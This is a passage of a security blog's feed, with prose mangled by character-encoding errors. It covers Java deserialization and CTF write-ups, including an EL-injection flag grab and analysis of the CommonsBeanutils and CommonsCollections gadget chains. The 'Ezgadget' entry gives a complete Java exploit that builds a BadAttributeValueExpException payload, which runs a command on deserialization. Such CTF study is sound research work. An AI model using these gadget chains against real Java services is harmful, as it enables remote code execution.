src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705151856.png"></p><p>è¿™é‡Œçš„cmdæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œåˆç”±äºä»£ç ç»™å‡ºäº†flagå˜é‡ï¼Œå¹¶ä¸”æ˜¯ä»ç¯å¢ƒå˜é‡ä¸­æå–çš„ã€‚</p><pre class="line-numbers language-java"><code class="language-java">String flag <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°è¯•ä¸€ä¸‹${flag},æ²¡ç”¨ã€‚ä½†æ˜¯é€šè¿‡æµ‹è¯•ï¼Œè¾“å…¥${java:flag}å‘ç°äº†æœ‰è¶£çš„äº‹ï¼ŒæŠ›å‡ºäº†å¼‚å¸¸ä¿¡æ¯ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705152609.png" width=850 height=320/><p>ç»è¿‡æœç´¢å‘ç°ELè¡¨è¾¾å¼å¯ä»¥è·å–ç¯å¢ƒå˜é‡:${env:xxx}ï¼Œé‚£ä¹ˆå°è¯•ç”¨${java:${env:FLAG}}ç›´æ¥ä»ç¯å¢ƒå˜é‡å–å‡ºflagã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705153104.png"></p><p>CTF{d95528534d14dc6eb6aeb81c994ce8bd}</p><p>è¿™é‡Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¾“å…¥${java:xxx}å°±æ˜¾ç¤ºExceptionï¼Œè€Œ${flag}è¿™æ ·çš„å½¢å¼å°±ä¸ä¼šè¾“å‡ºExceptionã€‚å¸Œæœ›çœ‹åˆ°çš„å¸ˆå‚…ä»¬èƒ½ç»™å‡ºè§£ç­”ï¼Œè·ªè°¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanutilsåˆ©ç”¨é“¾åˆ†æ</title>
      <link href="/2022/01/06/commonsbeanutils-li-yong-lian-fen-xi/"/>
      <url>/2022/01/06/commonsbeanutils-li-yong-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>commons-beanutilsæ˜¯ç”¨æ¥æ“ä½œJavaBeançš„å·¥å…·ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„getteræ–¹æ³•ã€‚</p><pre class="line-numbers language-java"><code class="language-java">PropertyUtils<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span> o1<span class="token punctuation">,</span> property <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>TempatesImpl#getOutputPropertiesæ–¹æ³•è§¦å‘äº†newTransformeræ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾è°èƒ½è°ƒç”¨getOutputPropertiesæ–¹æ³•ã€‚ä½†å®é™…ä¸Šåªæœ‰Processè¿™ä¸ªæ— æ³•åºåˆ—åŒ–çš„ç±»è°ƒç”¨äº†getOutputPropertiesã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909201618913.png" alt="image-20220909201618913"></p><p>è¿™æ¡é“¾çš„å·§å¦™å°±åœ¨äºåˆ©ç”¨CBèƒ½æ“çºµJavaBeançš„åŠŸèƒ½ï¼Œå¦‚æœgetPropertyçš„ä¸¤ä¸ªå‚æ•°éƒ½å¯æ§ï¼Œå³è°ƒç”¨getOutputProperties</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909201444286.png" alt="image-20220909201444286"></p><p>compareå°±å¾ˆç†Ÿæ‚‰äº†ï¼Œç»å…¸çš„CC2ï¼Œäºæ˜¯æˆ‘ä»¬å°±é€šè¿‡PriorityQueueè¿é€šäº†é“¾å­ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909202216854.png" alt="image-20220909202216854"></p><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>è§¦å‘PriorityQueueååºåˆ—åŒ–ï¼ŒCC2çš„ä¸€ç³»åˆ—æµç¨‹èµ°åˆ°PriorityQueue#siftDownUsingComparatorè¿›è€Œè§¦å‘BeanComparator#compareã€‚</p><p>æ³¨ï¼šä¸ºä»€ä¹ˆä¸æ˜¯åœ¨ä¸Šé¢çš„ifè¯­å¥è°ƒç”¨BeanComparator#compareï¼Ÿå› ä¸ºright&#x3D;2&#x3D;size,å› æ­¤ç¬¬ä¸€ä¸ªæ¡ä»¶ä¸æ»¡è¶³ï¼Œç›´æ¥è·³è¿‡è¯¥ifè¯­å¥ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909194436694.png" alt="image-20220909194436694"></p><p>è¿›å…¥BeanComparator#compareï¼ŒPropertyUtils#getPropertyæ–¹æ³•è‡ªåŠ¨è°ƒç”¨JavaBeançš„getteræ–¹æ³•ï¼Œpropertyè¢«èµ‹å€¼ä¸ºOutputPropertiesï¼Œå› æ­¤è°ƒç”¨TemplatesImpl#getOutputPropertiesæ–¹æ³•ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909194924113.png" alt="image-20220909194924113"></p><p>æ¥ä¸‹æ¥è°ƒç”¨newTransformeræ–¹æ³•ï¼Œå°±æ˜¯æ ‡å‡†çš„TemplatesImplåŠ è½½å­—èŠ‚ç ä»»æ„ä»£ç æ‰§è¡Œçš„æ“ä½œäº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909195557290.png" alt="image-20220909195557290"></p><h4 id="é“¾å­"><a href="#é“¾å­" class="headerlink" title="é“¾å­"></a>é“¾å­</h4><pre class="line-numbers language-java"><code class="language-java">PriorityQueue#readObjectBeanComparator#compareTemplatesImpl#getOutputPropertiesTemplatesImpl#newTransformerdefineClassnewInstance<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> CB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸œåæ¯ Ezgadget</title>
      <link href="/2021/12/31/dong-hua-bei-ezgadget/"/>
      <url>/2021/12/31/dong-hua-bei-ezgadget/</url>
      
        <content type="html"><![CDATA[<h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>é¢˜ç›®ç»™çš„æ˜¯ä¸€ä¸ªjaråŒ…ï¼Œè¿è¡Œä¹Ÿæ²¡å•¥ä¸œè¥¿ã€‚ç›´æ¥ç”¨IDEAåç¼–è¯‘jaråŒ…ã€‚</p><p>é¡¹ç›®ç›®å½•å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220901084000488.png" alt="image-20220901084000488"></p><p>ä¸ºäº†æ–¹ä¾¿å†™expï¼Œæˆ‘ç…§ç€è¿™ä¸ªç»“æ„æ„å»ºäº†é¡¹ç›®ï¼Œå¦‚æœåªæ˜¯å†™expçš„è¯åªéœ€æŠŠToolså’ŒToStringBeanè´´åˆ°é¡¹ç›®é‡Œå³å¯ã€‚å¦‚æœè¦debugï¼Œåˆ™ç”¨mavenæ„å»ºé¡¹ç›®æŠŠpom.xmlå¤åˆ¶è¿‡æ¥ï¼›å®Œå…¨æŒ‰ç…§åç¼–è¯‘ç»“æ„æ„å»ºé¡¹ç›®å³å¯ã€‚</p><h4 id="å®¡è®¡åˆ†æ"><a href="#å®¡è®¡åˆ†æ" class="headerlink" title="å®¡è®¡åˆ†æ"></a>å®¡è®¡åˆ†æ</h4><p>å…ˆä»Controllerå…¥æ‰‹</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/readobject"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">unser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"data"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> String data<span class="token punctuation">,</span> Model model<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> Tools<span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        String name <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> year <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> year <span class="token operator">==</span> <span class="token number">2021</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"welcome bro."</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜¾ç„¶è¦ä»&#x2F;readobjectè·¯ç”±å…¥æ‰‹ï¼Œä¼ å…¥çš„dataç”¨bas64è§£ç åè¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœè¾“å‡ºæµå†™å…¥å­—ç¬¦ä¸²ä¸ºgadgetsä¸”å†™å…¥Intä¸º2021ï¼Œåˆ™æ‰§è¡Œååºåˆ—åŒ–ã€‚</p><p>æ•´ä½“ååºåˆ—åŒ–æµç¨‹äº†è§£å®Œï¼Œæ¥ä¸‹æ¥å¯»æ‰¾å±é™©å‡½æ•°ã€‚</p><p>å¾ˆæ˜æ˜¾ï¼š</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ToStringBean</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ClassByte<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ToStringBean toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> toStringBean<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ClassByte<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ClassByte<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object var3 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"enjoy it."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ˜¯æ ‡å‡†çš„ç±»åŠ è½½å¹¶ä¸”è°ƒç”¨äº†newInstance();å®ä¾‹åŒ–ï¼Œå› æ­¤åªè¦æŠŠæ¶æ„ä»£ç å†™åœ¨é™æ€ä»£ç å—å³å¯è§¦å‘ã€‚</p><p>è€Œè¯¥æ¶æ„å‡½æ•°ä¸ºtoStringï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„æ–¹æ³•ï¼Œå› æ­¤ç›´æ¥ä»readObjectå…¥æ‰‹ï¼Œåœ¨CC5ä¸­çš„ååºåˆ—åŒ–å…¥å£ç±»BadAttributeValueExpExceptionæ­£æ˜¯è§¦å‘äº†toStringæ–¹æ³•ã€‚</p><p>**æ³¨æ„:BadAttributeValueExpExceptionæºäºjdkè‡ªå¸¦çš„rj.jaråŒ…ä¸­ã€‚ **</p><pre class="line-numbers language-java"><code class="language-java">Object valObj <span class="token operator">=</span> gf<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//...ç•¥</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Long</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Float</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Double</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Byte</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Short</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            val <span class="token operator">=</span> valObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// the serialized object is from a version without JDK-8019292 fix</span>            val <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>valObj<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"@"</span> <span class="token operator">+</span> valObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡æœ‰è®¾ç½®å®‰å…¨ç®¡ç†å™¨ï¼ŒSystem.getSecurityManager() &#x3D;&#x3D; nullï¼Œè€ŒvalObjæºè‡ªäºvalï¼Œè¯¥å€¼éœ€è¦é€šè¿‡åå°„ä¿®æ”¹ä¸ºToStringBean toStringbeanå³å¯è§¦å‘toStringã€‚</p><p>æ³¨æ„åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç”¨Toolsçš„base64ç¼–ç ã€‚</p><p>ç”±äºbase64ç¼–ç åçš„å­—ç¬¦ä¸²å­˜åœ¨+å·ï¼Œå› æ­¤éœ€è¦urlç¼–ç ä¸€å±‚ã€‚</p><p>gadget:</p><pre class="line-numbers language-java"><code class="language-java">BadAttributeValueExpException#readObjectToStringBean#toStringdefineClassnewInstance<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>ToStringBean<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>Tools<span class="token punctuation">.</span>base64Encode<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Payload</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NoSuchFieldException<span class="token punctuation">,</span> CannotCompileException<span class="token punctuation">,</span> NotFoundException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ToStringBean toStringBean<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">toStringBeanClass</span> <span class="token operator">=</span> ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field ClassByte <span class="token operator">=</span> toStringBeanClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"ClassByte"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClassByte<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClassByte<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">,</span>classBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>BadAttributeValueExpException<span class="token operator">></span> badAttributeValueExpExceptionClass <span class="token operator">=</span> BadAttributeValueExpException<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field badAttributeValueExpExceptionClassField  <span class="token operator">=</span> badAttributeValueExpExceptionClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        badAttributeValueExpExceptionClassField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        badAttributeValueExpExceptionClassField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes1 <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span>bytes1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220901092859118.png" alt="image-20220901092859118"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> CC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCåˆ©ç”¨é“¾æ€»ç»“</title>
      <link href="/2021/12/25/cc-li-yong-lian-zong-jie/"/>
      <url>/2021/12/25/cc-li-yong-lian-zong-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="CCåˆ©ç”¨é“¾ä¸€è§ˆå›¾"><a href="#CCåˆ©ç”¨é“¾ä¸€è§ˆå›¾" class="headerlink" title="CCåˆ©ç”¨é“¾ä¸€è§ˆå›¾"></a>CCåˆ©ç”¨é“¾ä¸€è§ˆå›¾</h4><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/CC%20(2).png" alt="CC (2)" style="zoom:200%;" /><h4 id="CC1-1"><a href="#CC1-1" class="headerlink" title="CC1-1"></a>CC1-1</h4><h5 id="ç‰ˆæœ¬"><a href="#ç‰ˆæœ¬" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h5><ol><li>jdk&lt;&#x3D;8u71</li><li>CommonsCollections 3.1 - 3.2.1ã€4.0</li></ol><h5 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h5><pre><code>AnnotationInvocationHandler#readobjectAbstractInputCheckedMapDecorator.MapEntry#setValueTransformedMap#checksetValueChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>8u71åå¯¹AnnotationInvocationHandlerç±»è¿›è¡Œäº†ä¿®å¤ï¼Œå› æ­¤åœ¨é«˜ç‰ˆæœ¬ä¸­æ— æ³•åˆ©ç”¨ã€‚</p><h4 id="CC1-2"><a href="#CC1-2" class="headerlink" title="CC1-2"></a>CC1-2</h4><h5 id="ç‰ˆæœ¬-1"><a href="#ç‰ˆæœ¬-1" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h5><ol><li>jdk&lt;&#x3D;8u71</li><li>CommonsCollections 3.1 - 3.2.1ã€4.0</li></ol><h5 id="gadget-1"><a href="#gadget-1" class="headerlink" title="gadget"></a>gadget</h5><pre><code>AnnotationInvocationHandler#readobjectProxy(AnnotationInvocationHandler).xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="æ€»ç»“-1"><a 